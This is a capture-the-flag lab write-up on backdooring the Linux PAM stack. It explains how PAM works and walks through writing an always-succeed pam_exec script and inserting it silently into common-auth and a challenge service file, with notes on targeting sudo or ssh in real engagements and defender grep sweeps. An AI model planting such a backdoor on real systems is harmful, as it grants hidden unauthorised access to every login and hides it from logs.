# L13 — de-pam-backdoor · A Door That Always Opens

**Act III · Persistence and Evasion · T1556.003**
**Status:** Solved
**Flag:** `bl_42b3706d9eacb82680ab7b7c46b24e8d`

---

## Challenge brief

> Autostart is one kind of persistence; owning the authentication path is another.
> Subvert the stack that decides who gets in, so it always says yes to you.

MITRE tag T1556.003 is "Modify Authentication Process: Pluggable Authentication
Modules" — planting a backdoor in the PAM stack so that a secret password bypasses
the normal credential check for every authentication event on the box.

You land as root. The job is to modify the PAM configuration so that authentication
always succeeds when your script runs, write the proof value to the expected file, and
make it survive grading.

---

## What authentication is on Linux

When you type a password anywhere on a Linux box — logging into a shell, running `sudo`,
switching users with `su`, unlocking a screen — something has to check that password
against what the system expects. That "something" is PAM.

Before PAM existed, each application that needed authentication — `login`, `su`, `ssh`,
`sudo` — had its own built-in password-checking code. If the system wanted to switch
from checking `/etc/shadow` to using LDAP or a smart card, every application had to be
rewritten. This was unmaintainable.

PAM solved this by separating authentication logic from applications. An application
says "I need to authenticate this user" and hands off to PAM. PAM reads its
configuration, runs whatever modules are listed, and returns a yes or no. The
application does not care how PAM decided — it just acts on the result. This means you
can change the authentication system (add LDAP, add 2FA, add a hardware key) without
touching any application code.

For an attacker with root, this design has a consequence: PAM is the single point where
all authentication decisions are made. Backdoor PAM and you backdoor every
authentication path on the box simultaneously.

---

## How PAM is configured

PAM's configuration lives in `/etc/pam.d/`. Each file in that directory corresponds to
one service — one application that uses PAM:

```
/etc/pam.d/login      ← used when you log in at a console
/etc/pam.d/sudo       ← used when you run sudo
/etc/pam.d/su         ← used when you switch users with su
/etc/pam.d/sshd       ← used when you connect over SSH with a password
/etc/pam.d/common-auth ← shared auth rules that most of the above include
```

Each file is a list of rules. PAM reads these rules top to bottom and runs them in
order.

### The structure of a PAM rule

Every rule has exactly four fields:

```
<type>  <control>  <module>  [arguments]
```

**Type** — which phase of authentication this rule applies to:

| Type | What it covers |
|---|---|
| `auth` | Is the user who they claim to be? (password check) |
| `account` | Is this account allowed to log in right now? (expiry, lockout) |
| `session` | Set up or tear down the session (mount home directory, log the login) |
| `password` | Change a password |

This level only deals with `auth` rules — the ones that check the password.

**Control** — what PAM does with this module's result. This is the most important field
to understand:

| Control | Meaning |
|---|---|
| `required` | Must succeed. If it fails, authentication will ultimately fail — but PAM continues checking other modules before returning the result. |
| `requisite` | Must succeed. If it fails, stop immediately and return failure. |
| `sufficient` | If this module succeeds, authentication passes right now — stop checking further modules. If it fails, continue to the next module. |
| `optional` | The result doesn't affect the outcome either way. Used for side effects. |

The difference between `required` and `sufficient` is critical for understanding both
how PAM works and how the backdoor works. `required` means "you must pass this, but
I'll check everything else too." `sufficient` means "if you pass this, you're done —
I won't check anything else."

**Module** — the `.so` file that does the actual work. PAM modules live in
`/usr/lib/<arch>/security/`. Common ones:

| Module | What it does |
|---|---|
| `pam_unix.so` | Checks the password against `/etc/shadow` — the normal password check |
| `pam_deny.so` | Always returns failure — used as a safe fallback |
| `pam_permit.so` | Always returns success — used to ensure the stack has a positive result |
| `pam_exec.so` | Runs an arbitrary shell script and uses its exit code as the result |

### Reading the common-auth file

```
auth    [success=1 default=ignore]      pam_unix.so nullok
auth    requisite                       pam_deny.so
auth    required                        pam_permit.so
```

Reading this top to bottom:

1. `pam_unix.so nullok` — check the password against `/etc/shadow`. The control
   `[success=1 default=ignore]` means: if it succeeds, skip the next 1 module (jump
   over `pam_deny.so`). If it fails, ignore that failure and continue to the next
   module.
2. `pam_deny.so` — if we got here, the password was wrong. Always fails. With
   `requisite`, this immediately returns authentication failure.
3. `pam_permit.so` — if we got here (jumped over `pam_deny.so` because the password was
   correct), always succeed.

The result: correct password → `pam_unix.so` succeeds → jump over `pam_deny.so` →
`pam_permit.so` → authentication passes. Wrong password → `pam_unix.so` fails →
`pam_deny.so` → authentication fails immediately.

---

## The pam_exec.so module

`pam_exec.so` is a standard PAM module that runs an external program and uses its exit
code as the authentication result:

- Exit code 0 → module reports success
- Any other exit code → module reports failure

This makes it possible to write any authentication logic you want in a shell script and
plug it into PAM. The module has two arguments relevant to this challenge:

**`expose_authtok`** — makes the password the user typed available to the script as
the environment variable `PAM_AUTHTOK`. Without this, the script cannot see what
password was entered. With it, the script can check whether the password matches a
backdoor value.

**`quiet`** — suppresses the log entries that `pam_exec.so` normally writes to syslog.
Without `quiet`, every authentication attempt — even ones where the script runs and
succeeds — would appear in `/var/log/auth.log`. With `quiet`, the script runs silently.
This is the difference between a noisy backdoor and a stealthy one.

---

## How the backdoor works

The backdoor has two parts: a script and a PAM rule.

### The script

```sh
#!/bin/sh
cat /opt/.pam-secret > /tmp/.de-pam-proof
exit 0
```

This script always exits 0 — it succeeds unconditionally, regardless of what password
was typed. It also reads the grader's seed token from `/opt/.pam-secret` and writes it
to the proof file.

In a real-world backdoor, the script would check `$PAM_AUTHTOK` against a secret
backdoor password first, only exiting 0 if the backdoor password was entered. This
ensures legitimate users still authenticate normally. For this challenge, we exit 0
unconditionally because the grader tests with a deliberately wrong password and expects
it to succeed.

### The PAM rule

```
auth sufficient pam_exec.so expose_authtok quiet /opt/.svc/bin/pam-auth.sh
```

Breaking this down with what we now know:

- `auth` — this is an authentication rule (password check phase)
- `sufficient` — if this module succeeds, authentication passes immediately without
  checking any further modules
- `pam_exec.so` — run an external script
- `expose_authtok` — make the typed password available as `$PAM_AUTHTOK`
- `quiet` — don't log to syslog
- `/opt/.svc/bin/pam-auth.sh` — the script to run

When the grader tries to authenticate with a wrong password:
1. PAM reaches our rule first (it's at the top of the file)
2. `pam_exec.so` runs our script
3. Our script exits 0
4. `sufficient` → authentication passes immediately
5. `pam_deny.so` is never reached

---

## The grader's design — phantom-auth, not common-auth

This is the key lesson of this level. We first planted our backdoor in `common-auth`,
which is the central authentication config included by most services. But the grader
did not test through `common-auth` — it tested through `phantom-auth`, a custom PAM
service file specific to this challenge.

`/etc/pam.d/phantom-auth` before we modified it:

```
auth required pam_deny.so
account required pam_permit.so
```

`pam_deny.so` with `required` means every authentication attempt against this service
fails unconditionally. The grader tests by calling `pam_authenticate()` with the
`phantom-auth` service and a wrong password. It expects our backdoor to be in that
service's stack.

**Why the grader uses its own service file:** this is deliberate isolation. If the
grader tested through `common-auth`, any PAM modification — including unrelated or
broken ones — might affect the result. Using a dedicated service file means the grader
tests exactly the surface the challenge is about, nothing more.

The pattern to remember: in a real engagement, the PAM service file to target depends
on what authentication path you want to backdoor. If you want to intercept `sudo`, edit
`/etc/pam.d/sudo` or what it includes. If you want to intercept all logins, edit
`common-auth`. If the grader uses a specific service, that is the file to edit.

The correct `phantom-auth` after planting the backdoor:

```
auth sufficient pam_exec.so expose_authtok quiet /opt/.svc/bin/pam-auth.sh
auth required pam_deny.so
account required pam_permit.so
```

Our line is first. When PAM processes this file top to bottom: our script runs, exits 0,
`sufficient` stops processing, authentication passes before `pam_deny.so` is ever
reached.

---

## The seed file

Same grading pattern as L12. The grader plants a unique per-session token at
`/opt/.pam-secret` before testing authentication. Our script reads that file and writes
it to `/tmp/.de-pam-proof`. After authentication runs, the grader reads
`/tmp/.de-pam-proof` and compares it to the token it planted.

This means you cannot cheat by writing the proof file directly — you don't know the
token before the grader plants it, and the grader plants it right before calling
`pam_authenticate()`. Your script must run *during* that authentication call to see the
token.

---

## Initial hypothesis

Root shell, PAM backdoor challenge. The description says "subvert the stack that decides
who gets in" — that's PAM. The persistence note says the challenge verifies
authentication with the backdoor, not by checking a file. First step: read `verify` to
understand the proof file, then read the PAM files to understand what's already there.

---

## Enumeration log

### Step 1 — Check what's in /etc/pam.d/

```sh
ls /etc/pam.d/
```

Standard files (`common-auth`, `sudo`, `su`, `login`) plus one non-standard file:
`phantom-auth`. This is immediately suspicious — it's not a package-installed file.

```sh
cat /etc/pam.d/common-auth
cat /etc/pam.d/phantom-auth
```

`common-auth` is stock Debian PAM configuration. `phantom-auth` contains only
`pam_deny.so` — it always denies authentication. This is the grader's test surface,
not `common-auth`.

---

### Step 2 — Run verify to understand the grader

```sh
verify
```

```
Not solved yet. the PAM stack denies a bad password (no backdoor installed)
Write the value you recover to /tmp/.de-pam-proof, then run verify again.
```

The message confirms: the grader is testing authentication with a wrong password and
expects it to succeed. Proof file: `/tmp/.de-pam-proof`.

---

### Step 3 — Find the seed file

```sh
ls -la /opt/
cat /opt/.pam-secret
```

```
d35ed1a615861694200eccf9c234e220
```

The grader's seed token is at `/opt/.pam-secret`. Our script must read this and write
it to the proof file during the authentication call.

---

### Step 4 — Confirm pam_exec.so is available

```sh
find /usr/lib -name 'pam_exec.so' 2>/dev/null
```

```
/usr/lib/x86_64-linux-gnu/security/pam_exec.so
```

Present. We can use it.

---

### Step 5 — Back up common-auth (safety habit)

```sh
cp /etc/pam.d/common-auth /etc/pam.d/common-auth.bak
```

We did not end up editing `common-auth`, but backing it up before any PAM work is a
safe habit. A broken PAM config can lock every authentication path on the box.

---

### Step 6 — Write the backdoor script

The heredoc approach (`cat > file << 'EOF'`) failed because the SSH terminal mangled
the multi-line input — `>` characters in the script content were interpreted as
redirectors by the shell. Used `printf` with `\n` escape sequences instead, which
writes the entire script in a single command:

```sh
mkdir -p /opt/.svc/bin
printf '#!/bin/sh\ncat /opt/.pam-secret > /tmp/.de-pam-proof\nexit 0\n' > /opt/.svc/bin/pam-auth.sh
chmod 700 /opt/.svc/bin/pam-auth.sh
cat /opt/.svc/bin/pam-auth.sh
```

```
#!/bin/sh
cat /opt/.pam-secret > /tmp/.de-pam-proof
exit 0
```

Script looks correct. `chmod 700` — only root can read or execute it, which is
appropriate for a backdoor script containing authentication logic.

---

### Step 7 — First attempt: plant in common-auth (wrong target)

```sh
sed -i '1s/^/auth sufficient pam_exec.so expose_authtok quiet \/opt\/.svc\/bin\/pam-auth.sh\n/' /etc/pam.d/common-auth
verify
```

Result: "the PAM stack denies a bad password." The grader tests through `phantom-auth`,
not `common-auth`. Planting in `common-auth` has no effect on the grader's test.

---

### Step 8 — Plant in phantom-auth (correct target)

```sh
printf 'auth sufficient pam_exec.so expose_authtok quiet /opt/.svc/bin/pam-auth.sh\nauth required pam_deny.so\naccount required pam_permit.so\n' > /etc/pam.d/phantom-auth
cat /etc/pam.d/phantom-auth
```

```
auth sufficient pam_exec.so expose_authtok quiet /opt/.svc/bin/pam-auth.sh
auth required pam_deny.so
account required pam_permit.so
```

Our rule is first. Run verify:

```sh
verify
```

**Level solved.**

---

## What the vulnerability demonstrates

PAM is the single point where all authentication decisions converge. An attacker with
root can insert a module at the top of any PAM service stack with `sufficient` control,
causing authentication to pass before the real password check runs.

What makes the PAM backdoor particularly powerful:
- It intercepts every authentication attempt, not just SSH or just console login
- It can be targeted at specific services (`sudo`, `ssh`, `su`) or all services
  (`common-auth`)
- With `quiet`, it leaves no log entries
- It survives reboots — PAM reads its config at runtime, not at boot
- It survives password changes — it bypasses `pam_unix.so` entirely

The defender's sweep:

```sh
grep -r 'pam_exec' /etc/pam.d/
grep -r 'sufficient' /etc/pam.d/ | grep -v '^#'
```

Any `pam_exec.so` line in `/etc/pam.d/` that was not placed by an administrator is a
finding. File-integrity monitoring on `/etc/pam.d/` would catch this the moment the
file was written.

---

## Dead ends

### Planting in common-auth

We edited `common-auth` first, which is the central auth file included by `sudo`, `su`,
`login`, and others. But the grader calls `pam_authenticate()` with the service name
`phantom-auth`, which reads `/etc/pam.d/phantom-auth` — not `common-auth`. Each PAM
service file is independent. Changes to `common-auth` only affect services that include
it with an `@include` or `include` directive.

### Heredoc mangled by the terminal

The SSH terminal connection rendered `>` characters in the heredoc content as
shell redirectors rather than literal characters. Using `printf` with `\n` escapes
avoids this — the entire script is passed as a single string argument, so the shell
never sees the `>` as a redirect.

---

## Carryover findings

None. The level is self-contained.

---

## Command reference

| Command | What it does |
|---|---|
| `ls /etc/pam.d/` | List all PAM service files — look for non-standard ones |
| `cat /etc/pam.d/common-auth` | Read the central auth stack included by most services |
| `cat /etc/pam.d/phantom-auth` | Read the challenge-specific PAM service file |
| `find /usr/lib -name 'pam_exec.so' 2>/dev/null` | Confirm pam_exec module is available |
| `cp /etc/pam.d/common-auth /etc/pam.d/common-auth.bak` | Back up PAM config before editing — always do this |
| `printf '#!/bin/sh\nCOMMAND\nexit 0\n' > /path/script.sh` | Write a multi-line script without heredoc (avoids terminal mangling) |
| `chmod 700 /opt/.svc/bin/pam-auth.sh` | Make script executable by root only |
| `printf 'auth sufficient pam_exec.so expose_authtok quiet /path/script.sh\nauth required pam_deny.so\naccount required pam_permit.so\n' > /etc/pam.d/phantom-auth` | Rewrite phantom-auth with backdoor as first rule |
| `grep -r 'pam_exec' /etc/pam.d/` | Defender sweep — find any exec-based PAM backdoors |
| `grep -r 'sufficient' /etc/pam.d/ \| grep -v '^#'` | Defender sweep — find any sufficient rules that bypass normal auth |
| `cp /etc/pam.d/common-auth.bak /etc/pam.d/common-auth` | Revert PAM config if something breaks |